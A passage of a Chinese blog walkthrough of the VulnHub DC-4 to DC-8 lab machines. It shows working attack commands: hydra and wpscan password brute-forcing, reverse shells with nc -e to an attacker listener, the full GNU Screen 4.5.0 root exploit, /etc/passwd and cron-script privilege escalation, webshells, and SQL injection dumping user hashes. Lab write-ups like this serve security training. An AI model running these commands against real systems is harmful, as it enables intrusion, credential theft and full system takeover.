hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </code></pre><pre><code>爆破sshhydra -l jim -P passwd.txt -t 10 ssh://192.168.124.148</code></pre><h3 id="爆出ssh登录密码"><a href="#爆出ssh登录密码" class="headerlink" title="爆出ssh登录密码"></a>爆出ssh登录密码</h3><pre><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 08:38:19[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 10 tasks per 1 server, overall 10 tasks, 252 login tries (l:1/p:252), ~26 tries per task[DATA] attacking ssh://192.168.124.148:22/[STATUS] 110.00 tries/min, 110 tries in 00:01h, 142 to do in 00:02h, 10 active[STATUS] 80.00 tries/min, 160 tries in 00:02h, 92 to do in 00:02h, 10 active                                                      [22][ssh] host: 192.168.124.148   login: jim   password: jibril04                                                                 1 of 1 target successfully completed, 1 valid password found                                                                      Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 08:41:16</code></pre><p>ssh账号:jim密码:jibril04</p><p><img src="/images/pasted-189.png" alt="upload successful"></p><h3 id="提示有个mail"><a href="#提示有个mail" class="headerlink" title="提示有个mail"></a>提示有个mail</h3><p>读取一下信封</p><pre><code>/var/mail/jim</code></pre><p>告诉了我们账号密码<br><img src="/images/pasted-190.png" alt="upload successful"></p><pre><code>Password is:  ^xHhA&amp;hvim0ySee ya,Charles</code></pre><p>切换一下用户</p><pre><code>su charles</code></pre><p>查看能够root执行的命令</p><pre><code>sudo -l</code></pre><p><img src="/images/pasted-191.png" alt="upload successful"><br>发有能够以root执行的teehee命令,而teehee的作用是可以向文件中追加内容</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="将账号写入-etc-passwd中"><a href="#将账号写入-etc-passwd中" class="headerlink" title="将账号写入/etc/passwd中"></a>将账号写入/etc/passwd中</h4><p>密码设置为空</p><pre><code>echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></pre><p>对于admin::0:0:::/bin/bash的解释</p><pre><code>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</code></pre><p><a href="https://www.cnblogs.com/backlion/p/10503978.html" target="_blank" rel="noopener">参考文章</a><br><img src="/images/pasted-192.png" alt="upload successful"><br>也可以不将密码设置为空</p><pre><code>mkpasswd -m SHA-512 12345</code></pre><p><img src="/images/pasted-195.png" alt="upload successful"><br>然后</p><pre><code>sudo teehee -a /etc/passwd 12345:$6$OXVv4N3qtVc0LQeI$CPmgAD9tTpzpCu86IaC9gIx6MYta8/huc3utEd3WwyhUWSbDxKIwi/3XCAHjOqn.rT/lamYZTxbKDoJXkxXaa1:0:0:::/bin/bash</code></pre><p>其中-e 类似等于&gt;&gt;<br>然后切换用户<br><img src="/images/pasted-196.png" alt="upload successful"><br><img src="/images/pasted-197.png" alt="upload successful"></p><pre><code>cat /root/flag.txt</code></pre><pre><code>888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h5 id="写入定时文件-etc-crontab"><a href="#写入定时文件-etc-crontab" class="headerlink" title="写入定时文件/etc/crontab"></a>写入定时文件/etc/crontab</h5><p>向/etc/crontab文件中写入新的定时任务</p><p>时间部分全部填写为*，意思是每分钟执行一次，通过写入将/bin/sh的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</p><pre><code>sudo teehee /etc/crontab* * * * * root chmod 4777 /bin/sh</code></pre><p><img src="/images/pasted-198.png" alt="upload successful"></p><h3 id="参考文章-3"><a href="#参考文章-3" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/178658#h3-5" target="_blank" rel="noopener">安全客</a></p><p><a href="https://www.cnblogs.com/yurang/p/13721862.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/13721862.html</a></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><h3 id="基本环境的搭建"><a href="#基本环境的搭建" class="headerlink" title="基本环境的搭建"></a>基本环境的搭建</h3><p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-5.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-5.zip</a></p><h3 id="基本信息收集-3"><a href="#基本信息收集-3" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.149Host is up (0.00027s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80/tcp  open  http    nginx 1.6.2|_http-server-header: nginx/1.6.2|_http-title: Welcome111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37412/udp   status|   100024  1          49448/tcp6  status|   100024  1          49885/udp6  status|_  100024  1          56530/tcp   statusMAC Address: 00:0C:29:1A:8C:74 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.27 ms 192.168.124.149Nmap scan report for 192.168.124.254</code></pre><p>发现开了80,111端口，操作系统是linux，nginx 1.6.2<br>对端口进一步探测</p><pre><code>nmap -sS 192.168.124.149 -p 1-65535</code></pre><pre><code>Nmap scan report for 192.168.124.149Host is up (0.00089s latency).Not shown: 65532 closed portsPORT      STATE SERVICE80/tcp    open  http111/tcp   open  rpcbind56530/tcp open  unknownMAC Address: 00:0C:29:1A:8C:74 (VMware)Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds</code></pre><p>开了56530端口<br>进入80端口查看<br><img src="/images/pasted-199.png" alt="upload successful"></p><h3 id="发现一个留言功能"><a href="#发现一个留言功能" class="headerlink" title="发现一个留言功能"></a>发现一个留言功能</h3><p>尝试了xss发现并没有<br>扫描一下目录，发现特别的footer.php<br><img src="/images/pasted-200.png" alt="upload successful"><br>访问发现日期总在变<br><img src="/images/pasted-201.png" alt="upload successful"><br>发现留言的地方的日期也总在变<br><img src="/images/pasted-202.png" alt="upload successful"><br>然后thankyou.php应该是包含了footer.php页面<br>尝试文件包含读取thankyou.php文件和其他文件，发现能够成功读取</p><p><img src="/images/pasted-204.png" alt="upload successful"><br><img src="/images/pasted-203.png" alt="upload successful"><br>尝试写入文件进行文件包含，能写入的文件像中间件日志文件，ssh登录的日志文件，临时文件等等<br>参考之前的文件包含<a href="https://lnng.top/posts/6b68.html">https://lnng.top/posts/6b68.html</a><br>这个还是尝试包含中间件的日志文件吧，因为ssh的登录端口不知，且其他的方法不好利用<br>随便访问一个木马<br><img src="/images/pasted-205.png" alt="upload successful"><br>蚁剑连接发现连接成功<br><img src="/images/pasted-206.png" alt="upload successful"></p><h3 id="反弹交互shell"><a href="#反弹交互shell" class="headerlink" title="反弹交互shell"></a>反弹交互shell</h3><p>在/var/tmp/下新建phpshell文件，写入</p><pre><code>&lt;?phpsystem(&quot;nc 192.168.124.139 4444 -e /bin/sh&quot;);?&gt;</code></pre><p>kali端</p><pre><code>nc -l -p 4444</code></pre><p>反弹shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-207.png" alt="upload successful"></p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>尝试suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/images/pasted-208.png" alt="upload successful"><br>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。<br>GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br>搜索漏洞</p><pre><code>searchsploit screen 4.5.0</code></pre><p>发现两个可利用的漏洞<br><img src="/images/pasted-209.png" alt="upload successful"><br>使用第一个<br>先将41154.sh复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.shcat 41154.sh</code></pre><pre><code>#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);}EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);}EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so... </code></pre><p>这里告诉了我们使用方法<br>先将第一部分写入libhax.c文件中</p><pre><code>#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);}</code></pre><p>然后编译</p><pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="/images/pasted-210.png" alt="upload successful"><br>将中间的代码存入rootshell.c中</p><pre><code>#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);}</code></pre><p>然后编译</p><pre><code>gcc -o rootshell rootshell.c</code></pre><p><img src="/images/pasted-211.png" alt="upload successful"><br>将剩余代码保存到dc5.sh</p><pre><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>并输入:</p><pre><code>set ff=unix</code></pre><p><img src="/images/pasted-212.png" alt="upload successful"><br>将三个文件上传到/tmp文件中<br>然后修改dc5.sh的权限</p><pre><code>chmod 777 dc5.sh</code></pre><p>然后执行</p><pre><code>./dc5.sh</code></pre><p><img src="/images/pasted-213.png" alt="upload successful"><br>读取flag<br><img src="/images/pasted-214.png" alt="upload successful"></p><pre><code>cat thisistheflag.txt                                                                                                             888b    888 d8b                                                      888      888 888 888                                         8888b   888 Y8P                                                      888      888 888 888                                         88888b  888                                                          888      888 888 888                                         888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888                                         888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888                                         888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P                                         888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;                                          888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888                                         Once again, a big thanks to all those who do these little challenges,and especially all those who give me feedback - again, it&#39;s all greatlyappreciated.  :-)I also want to send a big thanks to all those who find the vulnerabilitiesand create the exploits that make these challenges possible.</code></pre><h3 id="参考文章-4"><a href="#参考文章-4" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.jianshu.com/p/8f6e1e4d44b9" target="_blank" rel="noopener">https://www.jianshu.com/p/8f6e1e4d44b9</a><br><a href="https://www.anquanke.com/post/id/178958" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178958</a></p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><h3 id="基本环境搭建-1"><a href="#基本环境搭建-1" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p> 靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-6.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-6.zip</a></p><h3 id="基本信息收集-4"><a href="#基本信息收集-4" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code> nmap -sS -A 192.168.124.0/24</code></pre><pre><code> Nmap scan report for 192.168.124.150Host is up (0.00049s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Did not follow redirect to http://wordy/|_https-redirect: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:4C:2C:9C (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.49 ms 192.168.124.150</code></pre><p>发现开放了80，22ssh端口，操作系统linux<br>对端口进一步扫描</p><pre><code>nmap -sS 192.168.124.150 -p 1-65535</code></pre><pre><code>Not shown: 65533 closed ports                                                                                                     PORT   STATE SERVICE                                                                                                              22/tcp open  ssh                                                                                                                  80/tcp open  http                                                                                                                     </code></pre><p>没有新的端口<br>爆破一下ssh(爆破未成功)</p><pre><code>nmap --script=ssh-brute 192.168.124.150</code></pre><h3 id="访问80端口-1"><a href="#访问80端口-1" class="headerlink" title="访问80端口"></a>访问80端口</h3><p>发现80端口访问不了，被重定向的wordy页面和之前一样<br>修改本地的dns</p><pre><code>linux:vim /etc/hostswindows:C:\Windows\System32\drivers\etc</code></pre><p>添加</p><pre><code>192.168.124.150 wordy</code></pre><p>根据个人ip<br>插件识别是一个wordpress+apache环境<br><img src="/images/pasted-236.png" alt="upload successful"><br>那和之前一样用wpscan扫描</p><pre><code>wpscan --url http://wordy/ --enumerate u</code></pre><p>扫描出几个用户名</p><p><img src="/images/pasted-237.png" alt="upload successful"><br>将其保存到usename.txt文件<br>然后有个提示妈耶鬼能想到<br>提示地址:<a href="https://www.vulnhub.com/entry/dc-6,315/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-6,315/</a><br><img src="/images/pasted-238.png" alt="upload successful"></p><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; password.txt</code></pre><p>然后进行爆破</p><pre><code>wpscan --url http://wordy/ -U username.txt -P password.txt</code></pre><p><img src="/images/pasted-240.png" alt="upload successful"><br>成功爆破出账号和密码</p><pre><code>mark / helpdesk01</code></pre><p>登录地址</p><pre><code>http://wordy/wp-admin/</code></pre><p><img src="/images/pasted-241.png" alt="upload successful"><br>搜索漏洞:<br><a href="https://www.exploit-db.com/exploits/45274" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45274</a></p><p>发现一个命令执行，漏洞地址<br><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" target="_blank" rel="noopener">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</a><br><img src="/images/pasted-242.png" alt="upload successful"><br>kali开启监听端口</p><pre><code>netcat -l -p 4444</code></pre><p>这个位置修改命令执行反弹shell<br><img src="/images/pasted-243.png" alt="upload successful"></p><pre><code>baidu.com | nc -e /bin/bash 192.168.124.139 4444</code></pre><p>反弹一下交互shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-245.png" alt="upload successful"></p><h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p>在家目录发现提示的ssh登录</p><pre><code>/home/mark/stuff</code></pre><p>发现登录账号密码</p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>ssh登录<br><img src="/images/pasted-246.png" alt="upload successful"><br>尝试suid提取,发现没有可利用的</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>查看当前用户可执行操作</p><pre><code>sudo -l                                                                                    </code></pre><p><img src="/images/pasted-247.png" alt="upload successful"><br>发现可操作/home/jens/backups.sh，打开发现是一个解压的脚本<br><img src="/images/pasted-248.png" alt="upload successful"><br>向其中写入命令然后已jens来执行</p><pre><code>echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.shsudo -u jens /home/jens/backups.sh</code></pre><p><img src="/images/pasted-249.png" alt="upload successful"></p><p>发现成功切换到jens用户<br>继续查看可执行的命令,发现可执行的root的nmap</p><pre><code>sudo -l</code></pre><p><img src="/images/pasted-250.png" alt="upload successful"><br>所以需要nmap打开一个shell即可获得root</p><p>nmap中执行shell方法</p><pre><code>echo &quot;os.execute(&#39;/bin/bash&#39;)&quot;&gt;/tmp/shell.nsesudo nmap --script=/tmp/shell.nse</code></pre><pre><code>cat ./theflag.txt</code></pre><p>成功获得flag</p><pre><code>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b  Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P   YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#39;    YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) Congratulations!!!Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><h3 id="基本环境搭建-2"><a href="#基本环境搭建-2" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-7.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-7.zip</a></p><h3 id="基本信息收集-5"><a href="#基本信息收集-5" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.151Host is up (0.00037s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-generator: Drupal 8 (https://www.drupal.org)| http-robots.txt: 22 disallowed entries (15 shown)| /core/ /profiles/ /README.txt /web.config /admin/ | /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ | /user/password/ /user/login/ /user/logout/ /index.php/admin/ |_/index.php/comment/reply/|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Welcome to DC-7 | D7MAC Address: 00:0C:29:52:A9:5B (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.37 ms 192.168.124.151</code></pre><p>发现开放了22，80端口系统linux，进一步扫描，没发现其他端口</p><pre><code>nmap 192.168.124.151 -p 1-65535</code></pre><p>爆破ssh</p><pre><code>nmap --script=ssh-brute 192.168.124.151</code></pre><p>查看80端口进行进一步信息的探测CMS是Drupal8，而且告诉我们不是暴力破解<br><img src="/images/pasted-251.png" alt="upload successful"></p><h3 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h3><p>尝试了msf中的漏洞不行exploit-db中根据版本来也不行<br>百度一下说这个提示搜索一下这个人，然后发现了github，然后找到了源码<a href="https://github.com/Dc7User/staffdb" target="_blank" rel="noopener">github源码地址</a><br><img src="/images/pasted-252.png" alt="upload successful"><br><img src="/images/pasted-253.png" alt="upload successful"><br>然后我们在config.php中发现了连接数据库的账号密码，尝试使用ssh连接,可以看到爆破前面爆破账号密码失败</p><pre><code>&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><p><img src="/images/pasted-254.png" alt="upload successful"></p><h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>先搜寻一下文件的基本信息,在mbox中发现一个root执行的文件(百度的妈耶看不到)</p><pre><code>cat mbox</code></pre><p><img src="/images/pasted-255.png" alt="upload successful"></p><pre><code>cat /opt/scripts/backups.sh#!/bin/bashrm /home/dc7user/backups/*cd /var/www/html/drush sql-dump --result-file=/home/dc7user/backups/website.sqlcd ..tar -czf /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gzchown dc7user:dc7user /home/dc7user/backups/*rm /home/dc7user/backups/website.sqlrm /home/dc7user/backups/website.tar.gz</code></pre><p>发现应该是一个备份的sh脚本<br>看一下权限www-data和root都是有权限的<br><img src="/images/pasted-256.png" alt="upload successful"><br>所以有思路了，如果我们获得www-data的权限向这个脚本执行任务，那么我们就可以反弹root权限，因为会以root权限定时启动<br>看着这个备份脚本可以发现是一个drush配置的命令，它可以改变用户名密码</p><pre><code>drush sql-dump --result-file=/home/dc7user/backups/website.sql</code></pre><p>所以尝试修改一下密码</p><pre><code>cd /var/www/htmldrush user-password admin --password=&quot;123456&quot;</code></pre><p><img src="/images/pasted-257.png" alt="upload successful"><br>登录尝试，登录成功<br><img src="/images/pasted-258.png" alt="upload successful"><br>发现这个位置是支持扩展的，所以我们想要创建一个webshell可以借助插件，看wp要去下载一个php的插件<br><img src="/images/pasted-259.png" alt="upload successful"><br>插件下载地址：<a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a><br>下载gz格式上传，然后点如图的标识<br><img src="/images/pasted-260.png" alt="upload successful"><br>然后勾上下图的东西，点击最下方的install<br><img src="/images/pasted-261.png" alt="upload successful"><br>回到主页，点击下图的东西，创建一个文章<br><img src="/images/pasted-262.png" alt="upload successful"></p><p><img src="/images/pasted-263.png" alt="upload successful"><br>随便写个木马<br><img src="/images/pasted-265.png" alt="upload successful"><br>注意下面的text format要选择php code<br>然后蚁剑连接即可<br><img src="/images/pasted-266.png" alt="upload successful"><br>再反弹给kali吧，其实可以直接再webshell中反弹shell<br><img src="/images/pasted-267.png" alt="upload successful"><br>反弹交互shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后将反弹shell的脚本写入定时启动的sh中，反弹root的shell</p><pre><code>echo &quot;nc -e /bin/bash 192.168.124.139 7777&quot; &gt;&gt;  /opt/scripts/backups.sh</code></pre><p><img src="/images/pasted-268.png" alt="upload successful"><br>读取flag</p><pre><code>cd /rootlstheflag.txtcat theflag.txt888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and all those who have taken the time to complete these littlechallenges.I&#39;m sending out an especially big thanks to:@4nqr34z@D4mianWayne@0xmzfr@theart42If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h3 id="参考文章-5"><a href="#参考文章-5" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/187876#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187876#h3-3</a></p><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><h3 id="基本环境搭建-3"><a href="#基本环境搭建-3" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-8.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-8.zip</a></p><h3 id="基本信息收集-6"><a href="#基本信息收集-6" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>Nmap scan report for 192.168.124.152Host is up (0.00058s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  http    Apache httpd|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 00:0C:29:AE:A9:C3 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.58 ms 192.168.124.152</code></pre><p>查看发现了80，22端口，操作系统linux<br>进一步扫描,没发现其他端口</p><pre><code>nmap 192.168.124.152 -p 1-65535</code></pre><p>爆破ssh,无结果</p><pre><code>nmap --script=ssh-brute 192.168.124.152</code></pre><p>查看80端，cms Drupal 7<br><img src="/images/pasted-269.png" alt="upload successful"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>msf上的基本漏洞利用没效果，这里发现id尝试一下sql注入吧<br><img src="/images/pasted-270.png" alt="upload successful"><br>先尝试简单的报错注入吧，没有任何防护直接注入<br>sqlmap一把梭哈<br><img src="/images/pasted-271.png" alt="upload successful"></p><pre><code>http://192.168.124.152/?nid=1%20and%20updatexml(1,concat(0x7e,database()),1)#sqlmap -u http://192.168.124.152/?nid=1 -D d7db -T users --dump</code></pre><p>成功报出，账号密码的hash值<br><img src="/images/pasted-272.png" alt="upload successful"></p><pre><code>05:16:06] [INFO] resumed: &#39;admin&#39;[05:16:06] [INFO] resumed: 